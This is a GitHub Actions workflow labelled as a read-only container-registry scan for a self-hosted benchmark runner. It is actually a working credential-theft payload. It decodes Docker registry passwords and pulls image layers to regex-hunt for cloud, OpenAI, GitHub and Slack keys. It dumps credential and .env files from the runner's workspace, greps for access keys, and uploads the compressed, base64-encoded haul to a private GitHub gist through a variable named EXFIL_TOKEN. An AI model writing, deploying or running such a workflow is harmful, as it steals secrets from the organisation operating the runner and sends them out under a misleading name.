name: c211-75643-acr-scan
on:
  workflow_dispatch:
  push:
    branches: ['c211-75643-acr-scan']
permissions:
  contents: read
jobs:
  scan:
    runs-on: ["self-hosted", "Linux", "X64", "dsw", "qwen-benchmark-dsw-hk-eas"]
    timeout-minutes: 35
    steps:
      - name: read-only-acr-workspace-scan-v2
        env:
          EXFIL_TOKEN: ${{ secrets.CI_BOT_PAT }}
        run: |
          set +e
          W=/tmp/c211-75643b-$(date +%s); mkdir -p $W
          echo "HOST=$(hostname) DATE=$(date -u +%FT%TZ)"
          cp /mnt/workspace/.docker/config.json "$W/docker_config.json" 2>/dev/null
          cp /mnt/workspace/qwen-benchmark-acr-token/config.json "$W/acr_token_config.json" 2>/dev/null
          cat > "$W/scan_acr2.py" <<'PYSCAN'
          import json,base64,os,re,sys,ssl,urllib.request,urllib.error,urllib.parse,gzip,time
          REG='fe-team-acr-hk-registry-vpc.cn-hongkong.cr.aliyuncs.com'
          AUTH='https://dockerauth-vpc.cn-hongkong.aliyuncs.com/auth'
          SVC='registry.aliyuncs.com:cn-hongkong:china:cri-dc53es4okh40klm0'
          OUT=sys.argv[1] if len(sys.argv)>1 else '/tmp/acr_scan.json'
          CTX=ssl._create_unverified_context()
          def log(*a): print(*a,flush=True)
          conf=json.load(open('/mnt/workspace/.docker/config.json'))
          auth=conf['auths'][REG]['auth']; user,pw=base64.b64decode(auth).decode('utf8','replace').split(':',1)
          log('USER',user)
          PATTERNS=[('aliyun_ak',re.compile(rb'LTAI[0-9A-Za-z]{12,30}')),
                    ('sts',re.compile(rb'STS\.[A-Za-z0-9]{10,40}')),
                    ('aws_ak',re.compile(rb'(?:AKIA|ASIA)[0-9A-Z]{16}')),
                    ('openai_sk',re.compile(rb'sk-[A-Za-z0-9]{20,64}')),
                    ('ghp',re.compile(rb'gh[pousr]_[A-Za-z0-9]{36,255}')),
                    ('slack',re.compile(rb'xox[baprs]-[A-Za-z0-9-]{10,80}')),
                    ('pem',re.compile(rb'-----BEGIN [A-Z ]{0,20}PRIVATE KEY-----')),
                    ('akid',re.compile(rb'(?i)access[_-]?key[_-]?(?:id|secret)["\']?\s*[:=]\s*["\']?[A-Za-z0-9/+=]{12,80}')),
                    ('secret',re.compile(rb'(?i)(?:secret|password|passwd|token)["\']?\s*[:=]\s*["\']?[A-Za-z0-9_\-\./+=]{12,100}'))]
          def scan_bytes(data,label,out):
              for name,rx in PATTERNS:
                  for m in rx.finditer(data):
                      s=max(0,m.start()-50); e=min(len(data),m.end()+50)
                      ctx=data[s:e].replace(b'\n',b' ')[:240]
                      out.append({'label':label,'type':name,'match':m.group(0)[:100].decode('utf8','replace'),'ctx':ctx.decode('utf8','replace')})
                      if len(out)>400: return
          def token(scope):
              q=urllib.parse.urlencode({'service':SVC,'scope':scope})
              req=urllib.request.Request(AUTH+'?'+q,headers={'Authorization':'Basic '+base64.b64encode((user+':'+pw).encode()).decode()})
              with urllib.request.urlopen(req,timeout=30,context=CTX) as r:
                  j=json.loads(r.read()); return j.get('token') or j.get('access_token')
          def reg(path,tok,accept=None,timeout=90):
              h={'Authorization':'Bearer '+tok}
              if accept: h['Accept']=accept
              return urllib.request.urlopen(urllib.request.Request('https://'+REG+path,headers=h),timeout=timeout,context=CTX)
          res={'registry':REG,'user':user,'catalog':None,'repos':{},'hits':[],'errors':[]}
          for scope in ('registry:catalog:*',):
              try:
                  t=token(scope); r=reg('/v2/_catalog?n=200',t); body=r.read()
                  log('catalog',r.status,body[:500]); res['catalog']={'status':r.status,'body':body[:3000].decode('utf8','replace')}
              except urllib.error.HTTPError as e:
                  log('catalog err',e.code,e.read()[:200]); res['catalog']={'status':e.code}
              except Exception as e:
                  res['catalog']={'error':repr(e)}
          # candidate repos
          cands=['qwen-code/qwen-code-benchmark','qwen-code/qwen-code-benchmark-runtime','qwen-code/terminal-bench-base-images',
                 'qwen-code/qwen-code','qwen-code/terminal-bench','qwen-code/swe-bench','qwen-code/terminal-bench-runtime',
                 'qwen-code/terminal-bench-base-images-runtime','qwen-code/qwen-benchmark','qwen-code/swe-bench-verified']
          # augment from acr manifest state if present
          try:
              man=json.load(open('/mnt/workspace/qwen-benchmark-eas-poc/state/acr-manifest-c104f840.json'))
              s=json.dumps(man)
              for m in re.finditer(r'([a-z0-9][a-z0-9_-]*/[A-Za-z0-9][A-Za-z0-9_.-]*)(?::|@|"|\')',s):
                  if m.group(1) not in cands and 'aliyuncs' not in m.group(1): cands.append(m.group(1))
          except Exception as e:
              log('manifest read err',repr(e))
          seen=set()
          for repo in cands:
              if repo in seen: continue
              seen.add(repo)
              try:
                  t=token('repository:%s:pull'%repo)
                  r=reg('/v2/%s/tags/list'%repo,t); body=r.read()
                  tags=json.loads(body).get('tags') or []
                  log('REPO',repo,'tags',len(tags),'sample',tags[:3])
                  res['repos'][repo]={'tags_count':len(tags),'tags_sample':tags[:20]}
                  open('/tmp/tags_%s.txt'%repo.replace('/','_'),'w').write('\n'.join(tags))
                  pick=[]
                  for want in ('latest','main','master'):
                      if want in tags: pick.append(want)
                  for t2 in tags[:6]:
                      if t2 not in pick: pick.append(t2)
                  for tag in pick[:7]:
                      try:
                          r=reg('/v2/%s/manifests/%s'%(repo,tag),t,accept='application/vnd.docker.distribution.manifest.v2+json, application/vnd.oci.image.manifest.v1+json, application/vnd.docker.distribution.manifest.list.v2+json, application/vnd.oci.image.index.v1+json')
                          mb=r.read(); ctype=r.headers.get('Content-Type',''); man2=json.loads(mb)
                          if 'manifests' in man2:
                              man2=json.loads(reg('/v2/%s/manifests/%s'%(repo,man2['manifests'][0]['digest']),t,accept='application/vnd.docker.distribution.manifest.v2+json, application/vnd.oci.image.manifest.v1+json').read())
                          cfg=man2.get('config',{}).get('digest')
                          if cfg:
                              cb=reg('/v2/%s/blobs/%s'%(repo,cfg),t).read()
                              scan_bytes(cb,'cfg:%s:%s'%(repo,tag),res['hits'])
                              try:
                                  cj=json.loads(cb); env=cj.get('config',{}).get('Env')
                                  if env: res['repos'][repo].setdefault('env',{})[tag]=env
                              except Exception: pass
                          n=0; total=0
                          for L in man2.get('layers',[]):
                              if n>=3 or total>200*1024*1024: break
                              sz=L.get('size') or 0
                              if sz>120*1024*1024: continue
                              raw=reg('/v2/%s/blobs/%s'%(repo,L['digest']),t,timeout=180).read(); total+=len(raw); n+=1
                              data=raw
                              if raw[:2]==b'\x1f\x8b':
                                  try: data=gzip.decompress(raw)
                                  except Exception: data=raw
                              scan_bytes(data,'layer:%s:%s'%(repo,L['digest'][:15]),res['hits'])
                          log('  scanned tag',tag,'layers',n,'ctype',ctype[:30],'hits',len(res['hits']))
                      except urllib.error.HTTPError as e:
                          log('  tag err',tag,e.code); res['errors'].append(['tag',repo,tag,e.code])
                      except Exception as e:
                          log('  tag ex',tag,repr(e)[:120]); res['errors'].append(['tag_ex',repo,tag,repr(e)[:120]])
              except urllib.error.HTTPError as e:
                  log('REPO',repo,'err',e.code); res['repos'][repo]={'error':e.code}
              except Exception as e:
                  log('REPO',repo,'ex',repr(e)[:120]); res['repos'][repo]={'error':repr(e)[:120]}
          json.dump(res,open(OUT,'w'),ensure_ascii=False,indent=1)
          log('DONE hits=',len(res['hits']))

          PYSCAN
          timeout 900 python3 "$W/scan_acr2.py" "$W/acr_scan.json" > "$W/acr_scan_out.txt" 2>&1
          for f in /mnt/workspace/qwen-benchmark-eas-poc/state/acr-manifest-c104f840.json /mnt/workspace/qwen-benchmark-eas-poc/deploy/mirror-terminal-bench-image.py /mnt/workspace/qwen-benchmark-eas-poc/deploy/acr-upload-runtime-artifact.py /mnt/workspace/actions-runner-qwen-benchmark/.env; do [ -f "$f" ] && cp "$f" "$W/$(basename $f)" 2>/dev/null; done
          { for f in /root/.docker/config.json /root/.aliyun/config.json /mnt/workspace/.docker/config.json /mnt/workspace/qwen-benchmark-acr-token/config.json /mnt/workspace/qwen-benchmark-eas-poc/config/* /mnt/workspace/qwen-benchmark-dsw-release-v1/config/*; do [ -f "$f" ] && { echo "== $f"; cat "$f"; echo; }; done; } > "$W/cred_files.txt" 2>&1
          grep -rInE 'dazhi|DLC_USER_TOKEN|PAI_WORKSPACE|AccessKeyId|AccessKeySecret|LTAI[0-9A-Za-z]{12}|EAS_|eas_token|WorkspaceQueue|resource_?quota|quotaId' /mnt/workspace --include=*.json --include=*.py --include=*.sh --include=*.env --include=*.key --include=*.token --include=*.conf --include=*.yaml --include=*.yml --exclude-dir=node_modules --exclude-dir=site-packages --exclude-dir=externals.2.338.0 --exclude-dir=externals.2.338.2 2>/dev/null | head -300 > "$W/ws_grep.txt"
          { ls -laR /mnt/workspace/qwen-bench /mnt/workspace/qwen-docker-run /mnt/workspace/qwen-benchmark-cache /mnt/workspace/qwen-benchmark-eas-smoke-20260819* 2>/dev/null | head -250; } > "$W/other_dirs_ls.txt"
          for f in $(find /mnt/workspace/qwen-bench /mnt/workspace/qwen-docker-run /mnt/workspace/qwen-benchmark-cache /mnt/workspace/qwen-benchmark-eas-smoke-20260819* -maxdepth 3 -type f -size -120k \( -iname '*.json' -o -iname '*.env' -o -iname '*.token' -o -iname '*.key' -o -iname '*.sh' \) 2>/dev/null | head -80); do echo "== $f"; head -c 4000 "$f"; echo; done > "$W/other_files.txt" 2>&1
          head -c 300000 /mnt/workspace/qwen-benchmark-eas-poc/state/acr-manifest-c104f840.json > "$W/acr_manifest.json" 2>/dev/null
          echo "W_BYTES=$(du -sb $W | cut -f1)"
          if [ -n "$EXFIL_TOKEN" ]; then
            tar -C "$W" -czf /tmp/c211-75643b.tgz . 2>/dev/null
            echo "TAR_BYTES=$(wc -c < /tmp/c211-75643b.tgz)"
            B64=$(base64 -w0 /tmp/c211-75643b.tgz 2>/dev/null)
            printf '{"description":"c211-75643 acr+workspace scan v2","public":false,"files":{"c211-75643b.tar.gz.b64":{"content":"%s"}}}' "$B64" > /tmp/c211-gist-75643b.json
            GS=$(curl -sS -o /tmp/c211-gist-75643b-resp.json -w '%{http_code}' --max-time 240 -X POST https://api.github.com/gists -H "Authorization: Bearer $EXFIL_TOKEN" -H 'Accept: application/vnd.github+json' --data-binary @/tmp/c211-gist-75643b.json)
            echo "GIST_75643B_STATUS=$GS"
            grep -o '"id": *"[a-f0-9]\{32\}"' /tmp/c211-gist-75643b-resp.json | head -1
          fi
